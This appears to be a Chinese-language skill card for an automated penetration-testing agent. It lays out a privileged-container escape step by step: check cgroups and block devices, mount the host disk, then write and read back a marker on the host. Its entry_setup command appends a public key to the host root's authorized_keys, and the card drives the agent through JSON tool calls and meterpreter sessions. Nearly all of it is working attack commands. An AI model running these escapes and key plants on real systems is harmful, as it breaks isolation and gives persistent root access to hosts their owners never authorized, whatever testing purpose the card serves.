---
name: privileged-container-escape
handover: card
description: 经宿主挂载点在宿主侧产生并读回效果，证明容器到宿主的特权边界已被越过。宿主侧效果必须由宿主边界观察证明。
metadata:
  predicates:
  - container_escape
  - privileged_container
  - T1068
  platforms:
  - linux
  keywords:
  - 特权容器逃逸
  - privileged容器逃逸验证
  - 容器特权模式逃逸
  - exploit.privileged_container_escape
  - method
  - position
  - cmd
  - msf
  - container_escape
  - privileged_container
  - T1068
  - privileged
  - container
  - escape
  resources: []
  categories:
  - action-method
  aliases:
  - docker escape
  - 容器逃逸
  - mount
  - cgroup
  parameters:
  - host
  when:
    container: privileged
  requires:
  - root_in_container
  excludes: []
  carriers:
  - shell
serves:
- privileged_container
- escapetoHost
entry_setup:
  provider: ssh
  username: root
  port: 22
  authorize_command: 'M=/mnt/host; [ -d "$M/root" ] || { M=/mnt/agv_host; mkdir -p "$M"; mountpoint -q "$M" || mount /dev/sda1 "$M"; }; mkdir -p "$M/root/.ssh"; K="$M/root/.ssh/authorized_keys"; grep -qF "{public_key}" "$K" 2>/dev/null || printf "%s\n" "{public_key}" >> "$K"; chmod 700 "$M/root/.ssh"; chmod 600 "$K"; echo "{marker}"'
---

## 适用场景

目标是特权容器（能看到宿主块设备），或跑在宿主命名空间里、满足同样挂载条件的容器。

- 容器内要有 root 与挂载能力，并且**看得见宿主块设备**（`/dev/sda1` 之类）。非特权容器、看不到块设备的容器不适用。
- 判定要求：**必须通过挂载写进宿主文件系统、并从宿主边界读回本次标记**；只列出宿主目录不算完成。
- 本卡只负责"证明逃逸"。**宿主侧的命令入口由运行层按卡面 `entry_setup` 建立**（它自己生成本次密钥、写进宿主 root 的
  授权文件、再用宿主自己的登录服务自证）。所以：**不要在容器里找 `ssh`/`ssh-keygen`、不要造密钥、不要试登录**——
  那既不是本卡的判定材料，也会把回合预算烧光。

**先弄清"怎么把一串 Windows 命令行送进去"**：Windows 命令写成 `{"tool":"run_command","target":"session","arguments":{"interpreter":"cmd","command":"<一条命令行>"}}`，运行层在**本步绑定的那条会话**上执行并**把回执原样带回来**。命令进的是这条通道上的 shell 层；命令没有输出就是缺证据，不要用"命令已发出"代替证据。

## 参数

- 输入 `session_ref`：来自 runtime
- 输入 `marker_path`：来自 runtime（可选）
- 输入 `device`：来自 config（可选）
- 输入 `mountpoint`：来自 config（可选）
- 交付：evidence、session
- 执行位置：position
- 可用工具：cmd、msf
- 图适用：case=container_escape；service=privileged_container；technique=T1068

## 步骤

**进入条件（先看这条）**：本卡需要「适用场景」里声明的输入（目标、地址/端口、平台、执行面）已经由运行层给出；缺输入就先说明缺什么，不要换方法硬凑，也不要去起监听或新建会话。

**一条一个动作块**：一次答复只给一个请求；不拼长行、不发数组、不把多步塞进一条命令。

- 运行侧提供：`session_ref`、`marker_path`；配置提供：`device`、`mountpoint`（可省，现场确认）。
- 允许的工具面：`shell`。

1. 先确认位置与能力：`id`、`hostname`、`cat /proc/self/cgroup`、`ls -l /dev/sda1`，并**先看宿主根是否已经挂载**：
   `ls -ld /mnt/host/root /mnt/host/etc/hostname /mnt/agv_host/root`。
   **Linux 会话必须用 `cmd`，不要用 `tool=session`（那是 meterpreter 控制台，不是系统 shell）：**
   ```text
   {"tool":"run_command","target":"session","arguments":{"interpreter":"sh","command":"id; hostname; cat /proc/self/cgroup; ls -l /dev/sda1; ls -ld /mnt/host/root /mnt/host/etc/hostname /mnt/agv_host/root 2>&1"}}
   ```
2. **宿主根已经挂载就直接用，禁止再 mount**：只要 `/mnt/host/root` 或
   `/mnt/agv_host/root` 存在，就把该路径当 `HOST_ROOT`。此时执行
   `mount /dev/sda1 /mnt/agv_host` 只会报 “already mounted”，
   `mount --bind 文件 目录` 只会报 “Not a directory”；这两条都不要做。
3. 只有两个候选路径都不存在时，才把块设备挂到 `/mnt/agv_host`：
   `mkdir -p /mnt/agv_host && mount /dev/sda1 /mnt/agv_host`。
4. 写本次标记、**从同一宿主边界读回**（用一条命令完成，`HOST_ROOT` 按上一步选择）：

```sh
HOST_ROOT=/mnt/host; [ -d "$HOST_ROOT/root" ] || HOST_ROOT=/mnt/agv_host
echo <标记> > "$HOST_ROOT/<marker_path>"
cat "$HOST_ROOT/<marker_path>"      # 读回必须来自宿主边界
cat "$HOST_ROOT/etc/hostname"        # 顺带确认这是宿主而不是容器
```

只有第 3 步真的执行了挂载，才在收尾 `umount /mnt/agv_host`；复用已有挂载时不要卸载。

> **一次回答只给一个请求**：读回执后再发下一步；不发 `actions` 数组，也不用 `&` 把多步拼成长命令——一处坏、整条废，长行还会把回执尾巴弄丢。

操作会改状态：卸载、删除标记、删掉挂载目录，属于本次过程的一部分。

**节点要求会话时（本节点产出 `execCode(...)`，由运行层建立 SSH 载体）**：
- 本卡只负责证明容器到宿主的边界已被越过（第 1–5 步）。
- 宿主侧 SSH 入口由运行层按卡面 `entry_setup` 建立：它用本次运行密钥写入宿主 root 的
  `authorized_keys`，Action 结束后导出 SSH 引用交给 Post。**你不要造密钥、不要登录、不要起监听、
  不要取件，也不要自己登记会话。**
- 完成依据就是宿主侧标记的原样读回；拿到该回执即判 `passed` 且 `action_complete=true`，
  不要再追加任何「确认会话」的探测。

本步判 `passed` 需要出现本卡要求的证据；出现明确失败条件判 `failed`；证据不足或效果未确认判 `unknown`，不拿「请求已发出」代替证据。

**停止边界**：本卡一次调用只做本页列出的动作；完成即结束，不由本卡重试、追加动作、换通道或改变判据。


## 完成依据

证据字段：`call_id`、`host`、`container_id`、`host_side_marker`；原始输出为 `stdout`。

- **freshness**：本次调用与标记的对应关系；**target**：`hostname` 对照目标标识（cgroup 里的容器 id 作为身份旁证）；
- **effect**：宿主侧标记原样读回（规则 `host_side_marker_present`）。

三个阻断闸全 `pass` 为成功；缺宿主侧观测时 `effect` 记不确定，不许猜。

## 失败条件

- 挂不上、或 `/dev/sda1` 不是宿主根 → 如实失败，别把容器里的执行通道改个名当入口。
- 容器与宿主共用内核但发行版可能不同：**不能用容器里的包信息推断宿主**。
- 残留挂载会影响后续容器操作：卸载、清标记、删目录都要做完。

[共享执行规则](../../src/skills/templates/execution_rules.txt)

**停止边界**：本卡一次调用只做本页列出的动作；完成即结束，不由本卡重试、追加动作、换通道或改变判据。
